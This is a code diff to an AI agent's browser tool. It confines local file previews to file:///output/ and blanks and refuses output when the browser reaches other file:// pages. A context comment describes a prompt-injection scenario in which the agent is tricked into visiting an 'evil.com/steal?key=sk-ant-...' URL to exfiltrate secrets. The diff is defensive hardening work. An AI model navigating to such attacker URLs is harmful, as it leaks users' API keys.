@@ -61,6 +61,7 @@ import sys
 import tempfile
 import threading
 import time
+import urllib.parse
 import requests
 from typing import Dict, Any, Optional, List, Tuple, Union
 from pathlib import Path
@@ -139,6 +140,7 @@ from plugins.browser.browser_use.provider import (  # noqa: F401
 from plugins.browser.firecrawl.provider import (  # noqa: F401
     FirecrawlBrowserProvider as FirecrawlProvider,
 )
+from tools.output_preview import output_preview_url as _output_preview_url
 from tools.tool_backend_helpers import normalize_browser_cloud_provider
 # Camofox local anti-detection browser backend (optional).
 # When CAMOFOX_URL is set, all browser operations route through the
@@ -149,6 +151,9 @@ except ImportError:
     _is_camofox_mode = lambda: False  # noqa: E731
 
 logger = logging.getLogger(__name__)
+
+_output_preview_lock = threading.Lock()
+_output_preview_session_keys: set[str] = set()
 
 # Standard PATH entries for environments with minimal PATH (e.g. systemd services).
 # Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
@@ -2817,7 +2822,6 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
     from agent.redact import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
@@ -2835,6 +2839,27 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
                      "Secrets must not be sent in URLs.",
         })
 
+    try:
+        output_preview_url = _output_preview_url(url)
+    except ValueError:
+        return json.dumps({
+            "success": False,
+            "error": (
+                "Blocked: local file previews are confined to existing regular "
+                "files beneath file:///output/; authorities, query strings, "
+                "fragments, traversal, and symlinks are not allowed."
+            ),
+        })
+
+    if output_preview_url and _is_camofox_mode():
+        return json.dumps({
+            "success": False,
+            "error": (
+                "Local /output file preview requires the agent-browser Chromium "
+                "backend; Camofox cannot access the confined loopback preview."
+            ),
+        })
+
     # SSRF protection — block private/internal addresses before navigating.
     # Skipped for local backends (Camofox, headless Chromium without a cloud
     # provider) because the agent already has full local network access via
@@ -2844,8 +2869,13 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # cloud provider never sees the URL in that case.  Can also be opted
     # out globally via ``browser.allow_private_urls`` in config.
     effective_task_id = task_id or "default"
-    nav_session_key = _navigation_session_key(effective_task_id, url)
+    nav_session_key = (
+        f"{effective_task_id}{_LOCAL_SUFFIX}"
+        if output_preview_url
+        else _navigation_session_key(effective_task_id, url)
+    )
     auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
+    navigation_url = output_preview_url or url
 
     sensitive_query_key = _sensitive_query_param_name(url)
     if sensitive_query_key and not _is_local_backend() and not auto_local_this_nav:
@@ -2899,7 +2929,12 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         from tools.browser_camofox import camofox_navigate
         return camofox_navigate(url, task_id)
 
-    if auto_local_this_nav:
+    if output_preview_url:
+        logger.info(
+            "browser_navigate: serving a confined /output preview through "
+            "a local Chromium sidecar"
+        )
+    elif auto_local_this_nav:
         logger.info(
             "browser_navigate: auto-routing %s to local Chromium sidecar "
             "(cloud provider %s stays on cloud for public URLs; "
@@ -2921,14 +2956,24 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     result = _run_browser_command(
         nav_session_key,
         "open",
-        [url],
+        [navigation_url],
         timeout=_get_open_command_timeout(first_open=is_first_nav),
     )
 
     if result.get("success"):
         data = result.get("data", {})
         title = data.get("title", "")
-        final_url = data.get("url", url)
+        final_url = data.get("url", navigation_url)
+
+        # The confined preview never hands Chromium a file:// URL. Any file
+        # URL reached here came through another navigation path and must be
+        # blanked before an automatic snapshot can disclose VM-local content.
+        if urllib.parse.urlsplit(final_url).scheme.lower() == "file":
+            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: browser navigation reached an unconfined local file",
+            })
 
         # Post-redirect SSRF check — if the browser followed a redirect to a
         # private/internal address, block the result so the model can't read
@@ -2941,7 +2986,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         # check for rationale (#16234).
         if (
             final_url
-            and final_url != url
+            and final_url != navigation_url
             and _is_always_blocked_url(final_url)
         ):
             _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
@@ -2954,7 +2999,9 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             not _is_local_backend()
             and not auto_local_this_nav
             and not _allow_private_urls()
-            and final_url and final_url != url and not _is_safe_url(final_url)
+            and final_url
+            and final_url != navigation_url
+            and not _is_safe_url(final_url)
         ):
             # Navigate away to a blank page to prevent snapshot leaks
             _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
@@ -2965,9 +3012,12 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
 
         response = {
             "success": True,
-            "url": final_url,
+            "url": url if output_preview_url and final_url == navigation_url else final_url,
             "title": title
         }
+        if output_preview_url:
+            with _output_preview_lock:
+                _output_preview_session_keys.add(nav_session_key)
         # Remember only a successful, non-blocked navigation as the task owner.
         # Failed opens and blocked redirects must not retarget follow-up clicks
         # or snapshots to a newly-created but irrelevant session.
@@ -3008,6 +3058,11 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         try:
             snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
             if snap_result.get("success"):
+                blocked_file = _blocked_local_file_page(
+                    nav_session_key, "return an automatic snapshot"
+                )
+                if blocked_file is not None:
+                    return blocked_file
                 snap_data = snap_result.get("data", {})
                 snapshot_text = snap_data.get("snapshot", "")
                 refs = snap_data.get("refs", {})
@@ -3061,6 +3116,10 @@ def browser_snapshot(
         data = result.get("data", {})
         snapshot_text = data.get("snapshot", "")
         refs = data.get("refs", {})
+
+        blocked_file = _blocked_local_file_page(effective_task_id, "return a snapshot")
+        if blocked_file is not None:
+            return blocked_file
 
         # ── Private-network guard: block snapshots from eval-navigated private pages ──
         # After any eval (browser_console) that may have changed location.href to a
@@ -3260,6 +3319,10 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
 
     effective_task_id = _last_session_key(task_id or "default")
 
+    blocked = _blocked_private_page_action(effective_task_id, "scroll")
+    if blocked is not None:
+        return blocked
+
     result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
     if not result.get("success"):
         response = {
@@ -3293,6 +3356,11 @@ def browser_back(task_id: Optional[str] = None) -> str:
     result = _run_browser_command(effective_task_id, "back", [])
 
     if result.get("success"):
+        blocked_file = _blocked_local_file_page(
+            effective_task_id, "return browser history"
+        )
+        if blocked_file is not None:
+            return blocked_file
         # Browser history can land on a private/internal/cloud-metadata
         # address that the browser_navigate preflight never saw (e.g. a
         # redirect chain from an earlier legitimate navigation touched an
@@ -3363,6 +3431,9 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
 
 def _blocked_private_page_action(effective_task_id: str, action: str) -> Optional[str]:
     """Return a blocked payload when an unsafe cloud page would receive input."""
+    blocked_file = _blocked_local_file_page(effective_task_id, action)
+    if blocked_file is not None:
+        return blocked_file
     if not _eval_ssrf_guard_active(effective_task_id):
         return None
     blocked_url = _current_page_private_url(effective_task_id)
@@ -3406,6 +3477,10 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
         return camofox_console(clear, task_id)
 
     effective_task_id = _last_session_key(task_id or "default")
+
+    blocked_file = _blocked_local_file_page(effective_task_id, "return console data")
+    if blocked_file is not None:
+        return blocked_file
 
     if _eval_ssrf_guard_active(effective_task_id):
         _blocked_url = _current_page_private_url(effective_task_id)
@@ -3521,6 +3596,42 @@ def _current_page_private_url(effective_task_id: str) -> Optional[str]:
     except Exception as exc:
         logger.debug("_current_page_private_url: probe failed (%s)", exc)
     return None
+
+
+def _current_page_file_url(effective_task_id: str) -> Optional[str]:
+    """Return the current page URL when Chromium reached any file:// page."""
+    try:
+        url_result = _run_browser_command(
+            effective_task_id, "eval", ["window.location.href"],
+            timeout=5, _engine_override="auto",
+        )
+        if url_result.get("success"):
+            current_url = (
+                url_result.get("data", {}).get("result", "")
+                .strip().strip('"').strip("'")
+            )
+            if urllib.parse.urlsplit(current_url).scheme.lower() == "file":
+                return current_url
+    except Exception as exc:
+        logger.debug("_current_page_file_url: probe failed (%s)", exc)
+    return None
+
+
+def _blocked_local_file_page(effective_task_id: str, action: str) -> Optional[str]:
+    """Blank and reject a file:// page reached outside the preview proxy."""
+    with _output_preview_lock:
+        if effective_task_id not in _output_preview_session_keys:
+            return None
+    if not _current_page_file_url(effective_task_id):
+        return None
+    _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
+    return json.dumps({
+        "success": False,
+        "error": (
+            "Blocked: browser reached an unconfined local file; refusing to "
+            f"{action}. Local previews must start beneath file:///output/."
+        ),
+    }, ensure_ascii=False)
 
 
 _RISKY_BROWSER_EVAL_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
@@ -3680,6 +3791,10 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate a JavaScript expression in the page context and return the result."""
     effective_task_id = _last_session_key(task_id or "default")
 
+    blocked_file = _blocked_local_file_page(effective_task_id, "evaluate JavaScript")
+    if blocked_file is not None:
+        return blocked_file
+
     if _eval_ssrf_guard_active(effective_task_id):
         blocked_literal = _expression_targets_private_url(expression)
         if blocked_literal:
@@ -3727,6 +3842,11 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
                         parsed = json.loads(raw_result)
                     except (json.JSONDecodeError, ValueError):
                         pass  # keep as string
+                blocked_file = _blocked_local_file_page(
+                    effective_task_id, "return an evaluation result"
+                )
+                if blocked_file is not None:
+                    return blocked_file
                 # Post-eval page-URL recheck: if this (or a prior) eval
                 # navigated the page to a private address, withhold the result.
                 if _eval_ssrf_guard_active(effective_task_id):
@@ -3816,6 +3936,11 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
         "result": _redact_browser_output(parsed),
         "result_type": type(parsed).__name__,
     }
+    blocked_file = _blocked_local_file_page(
+        effective_task_id, "return an evaluation result"
+    )
+    if blocked_file is not None:
+        return blocked_file
     # Post-eval page-URL recheck: if this (or a prior) eval navigated the page
     # to a private address, withhold the result (mirrors the supervisor path).
     if _eval_ssrf_guard_active(effective_task_id):
@@ -3982,6 +4107,11 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
     result = _run_browser_command(effective_task_id, "eval", [js_code])
 
     if result.get("success"):
+        blocked_file = _blocked_local_file_page(
+            effective_task_id, "return image metadata"
+        )
+        if blocked_file is not None:
+            return blocked_file
         # ── Private-network guard (sibling of snapshot/vision/eval guards) ──
         if _eval_ssrf_guard_active(effective_task_id):
             _blocked_url = _current_page_private_url(effective_task_id)
@@ -4060,6 +4190,10 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
     screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
     effective_task_id = _last_session_key(task_id or "default")
+
+    blocked_file = _blocked_local_file_page(effective_task_id, "capture a screenshot")
+    if blocked_file is not None:
+        return blocked_file
 
     # ── Private-network guard: block vision from eval-navigated private pages ──
     # After any eval (browser_console) that may have changed location.href to a
@@ -4426,6 +4560,8 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
 
 def _cleanup_single_browser_session(task_id: str) -> None:
     """Internal: reap a single browser session by its exact session key."""
+    with _output_preview_lock:
+        _output_preview_session_keys.discard(task_id)
     # Stop the CDP supervisor for this task FIRST so we close our WebSocket
     # before the backend tears down the underlying CDP endpoint.
     _stop_cdp_supervisor(task_id)
